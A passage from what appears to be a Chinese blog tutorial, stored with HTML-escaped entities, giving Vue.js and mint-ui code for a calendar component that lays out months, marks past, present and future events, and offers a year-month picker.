(nowDate.getSeconds() + '').padStart(2,'0') return `$&#123;yy&#125;-$&#123;mm&#125;-$&#123;dd&#125;` // -$&#123;hh&#125;-$&#123;mt&#125;-$&#123;ss&#125; &#125;, // 组件传值 getDateInfo(year, month) &#123; let _this = this _this.propsTime = `$&#123;year&#125;-$&#123;month&#125;` _this.calendarVisible = false // 模拟点击选取其他年月的ajax，假数据，只能显示19年 5 6 7三个月 setTimeout(() =&gt; &#123; _this.propsInfoList = [] let middle if(month == '05') &#123; middle = [ &#123; id: '232', date: '2019-05-10', info: '我要去吃小餐' &#125; ] &#125; else if (month == '06') &#123; middle = _this.middle &#125; else if (month == '07') &#123; middle = [ &#123; id: '232', date: '2019-07-10', info: '我要去吃小餐' &#125; ] &#125; else &#123; middle = '' &#125; _this.propsInfoList = JSON.stringify(middle) _this.calendarVisible = true &#125;, 100) &#125; &#125;&#125;&lt;/script&gt; 日历子组件： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;template&gt; &lt;div class=\"calendar-container\"&gt; // 日历标题 &lt;h1&gt;calendar&lt;/h1&gt; // 显示本月日期 2019-6，可点击 &lt;div class=\"show-date\" @click=\"clickData\"&gt;&#123;&#123;showDate&#125;&#125;&lt;/div&gt; // 今天的日期 2019-6-6 &lt;div class=\"now-time\"&gt;今日：&#123;&#123;exactTime&#125;&#125;&lt;/div&gt; // 日历组件 &lt;div class=\"calendar\"&gt; // 日历组件头部 &lt;ul class=\"calendar-header\"&gt; &lt;li&gt;日&lt;/li&gt; &lt;li&gt;一&lt;/li&gt; &lt;li&gt;二&lt;/li&gt; &lt;li&gt;三&lt;/li&gt; &lt;li&gt;四&lt;/li&gt; &lt;li&gt;五&lt;/li&gt; &lt;li&gt;六&lt;/li&gt; &lt;/ul&gt; // 日历组件主体 &lt;ul class=\"calendar-body\"&gt; &lt;li class=\"calendar-row\" v-for=\"(item, index) in JSON.parse(calendarData)\" :key=\"index\"&gt; // 注意给 不同的日子加类名 // 周末：weekend 工作日：weekday // 过去的事项 already-time 今天的事项 exact-time 将来的事项 soon-time // 给有事项的日子实现点击弹框，显示这天的事项内容 &lt;span v-for=\"(subItem, subIndex) in item\" :class=\"[subIndex == 0 || subIndex == 6? 'weekend': 'weekday', subItem.type == '1'? 'exact-time': '', subItem.type == '0'? 'already-time': '', subItem.type == '2'? 'soon-time': '']\" @click=\"showInfo(subItem)\" :key=\"subIndex\"&gt; &#123;&#123;subItem.date&#125;&#125; &lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; // popup 和 picker 搭配，实现 年月 选择 mint-ui 库 &lt;mt-popup v-model=\"popupVisible\" position=\"bottom\"&gt; &lt;mt-picker :slots=\"slots\" :showToolbar=\"true\" :visibleItemCount=\"5\" :itemHeight=\"itemsHeight\" ref=\"picker\"&gt; &lt;img src=\"@/assets/images/picker_cancel.png\" class=\"picker_cancel\" v-on:click=\"cancelFunc()\"&gt; &lt;img src =\"@/assets/images/picker_sure.png\" class=\"picker_sure\" v-on:click=\"sureFunc()\"&gt; &lt;/mt-picker&gt; &lt;/mt-popup&gt; &lt;/div&gt;&lt;/template&gt; 日历子组件逻辑： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192import &#123; MessageBox &#125; from 'mint-ui'export default &#123; name: \"calendar\", props: &#123; propsTime: String, propsInfoList: String &#125;, data() &#123; return &#123; // 接收父组件传值 '2019-06' time: '', // 接收父组件数据列表 infoList: '', // 日历组件 calendarData: [], // 页面展示的 '年-月' showDate: '', // 当前的 '年-月-日' exactTime: '', // picker 高度 itemsHeight: 95 * window.screen.height / 1334, // pupop 显示 popupVisible: false, // picker 数据 slots: [] &#125; &#125;, created() &#123; // 拿到父组件的 list this.infoList = this.propsInfoList // 拿到父组件的 '2019-06' this.time = this.propsTime.split('-') // 获取今天 '2019-06-06' const date = this.getToday() this.exactTime = date.slice(0,3).join('-') // 日历组件 this.getCalendar(...(this.time)) // 组装 picker 数组 this.getSlotsArray(...(date.slice(0,2))) &#125;, methods: &#123; // 日历组件 getCalendar(year, month) &#123; let _this = this // 转存当天 '2019-06-06' const rightNow = _this.exactTime // 拼接 显示日历上的年月 '2019-05' _this.showDate = `$&#123;year&#125;-$&#123;month&#125;` // 获取当月的第一天 const firstDate = new Date(year, month - 1, 1) // 获取第一天周几 const firstDay = firstDate.getDay() // 判断是否为闰年 const isLeapYear = year % 100 == 0? year % 400 == 0? 1: 0: year % 4 == 0 ? 1: 0 // 获取今年每个月的天数 const monthArray = [31, 28 + isLeapYear, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31] // 计算星期的行数 const weeekLines =Math.ceil((monthArray[month - 1] + firstDay)/7) let calendar = [] for(let i = 0; i &lt; weeekLines; i++) &#123; let weeekLinesInfo = [] for(let j = 0; j &lt; 7; j++) &#123; // 计算每个单元格的序号 const cellNo = i * 7 + j // 计算每个单元格应该填充的日期 const datePerLine = cellNo - firstDay + 1 // 排除空白格 if(datePerLine &lt;= 0 || datePerLine &gt; monthArray[month - 1]) &#123; // 不存在的显示为 null 和 '' let outOfMonth = &#123; \"type\" : 'null', \"date\" : '' &#125; weeekLinesInfo[j] = outOfMonth &#125; else &#123; let day = (datePerLine + '').padStart(2,'0') let inOfMonth = &#123; \"type\" : '', \"date\" : day, \"isDone\": '', \"infor\": '' &#125; // 今天背景变成一个红圈,这是今天 =&gt; rightNow const propsDate = `$&#123;year&#125;-$&#123;month&#125;-$&#123;day&#125;` // 比较每月的今天 if(propsDate == rightNow)&#123; inOfMonth.type = \"1\" &#125; const reservations = JSON.parse(_this.infoList) // 将 父组件传的 list 赋值在日历上 // 预定列表 和 当月每一天比较 for(let k = 0; k &lt; reservations.length; k++) &#123; if(propsDate == reservations[k].date)&#123; // inOfMonth.type = \"1\" inOfMonth.infor = reservations[k].info if(rightNow == reservations[k].date) &#123; inOfMonth.type = \"1\" inOfMonth.isDone = \"doing\" &#125; else if (rightNow &gt; reservations[k].date) &#123; inOfMonth.type = \"0\" inOfMonth.isDone = \"pass\" &#125; else if (rightNow &lt; reservations[k].date) &#123; inOfMonth.type = \"2\" inOfMonth.isDone = \"will\" &#125; &#125; &#125; weeekLinesInfo[j] = inOfMonth &#125; &#125; calendar.push(weeekLinesInfo) &#125; window.console.log(calendar) // 即将遍历二维数组 _this.calendarData = JSON.stringify(calendar) &#125;, // 格式化当前日期 YYYY-MM-DD getToday() &#123; let nowDate = new Date() let yy = nowDate.getFullYear().toString() let mm = (nowDate.getMonth() + 1 + '').padStart(2,'0') let dd = (nowDate.getDate() + '').padStart(2,'0') let hh = nowDate.getHours().toString().padStart(2,'0') let mt = (nowDate.getMinutes() + '').padStart(2,'0') let ss = (nowDate.getSeconds() + '').padStart(2,'0') return [yy, mm, dd, hh, mt, ss] // return `$&#123;yy&#125;-$&#123;mm&#125;-$&#123;dd&#125;-$&#123;hh&#125;-$&#123;mt&#125;-$&#123;ss&#125;` &#125;, // 组装 picker 数组 getSlotsArray(year, month)&#123; let _this = this let yearArray = [] for(let i = -10 ; i &lt;= 10 ; i ++)&#123; yearArray.push(year - 1 + i) &#125; let monthArray = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12] let slots = [ &#123; values:yearArray, className:\"slot1\", defaultIndex: 11 &#125;, &#123; values:monthArray, className:\"slot2\", defaultIndex:month - 1 &#125; ] _this.slots = slots &#125;, // 显示日期弹窗 clickData()&#123; this.popupVisible = true &#125;, // 取消按钮 cancelFunc()&#123; this.popupVisible = false; &#125;, // 确认按钮 sureFunc() &#123; let _this = this _this.popupVisible = false const clickData = _this.$refs.picker.getValues() const year = clickData[0] + '' const month = (clickData[1] + '').padStart(2,'0') const day = _this.time[2] _this.getDateInfo(year, month) _this.getCalendar(year, month) &#125;, // 调用父组件定义的方法 getDateInfo(year, month) &#123; this.$emit('getDateInfo', year, month) &#125;, // 点击展示某天的事项信息 showInfo(info) &#123; let _this = this const infor = info if(infor.infor) &#123; const [year, month] = _this.showDate.split('-') console.log(year, month, info) const titleDate = `$&#123;year&#125;-$&#123;month&#125;-$&#123;info.date&#125;` const preview = info.infor MessageBox(&#123; title: titleDate, message: preview, showCancelButton: false, closeOnClickModal: true &#125;) &#125; &#125; &#125;&#125; 其他：为了减少篇幅，省略样式 github地址","categories":[{"name":"vue.js","slug":"vue-js","permalink":"http://yoursite.com/categories/vue-js/"}],"tags":[{"name":"vue.js","slug":"vue-js","permalink":"http://yoursite.com/tags/vue-js/"}]}]}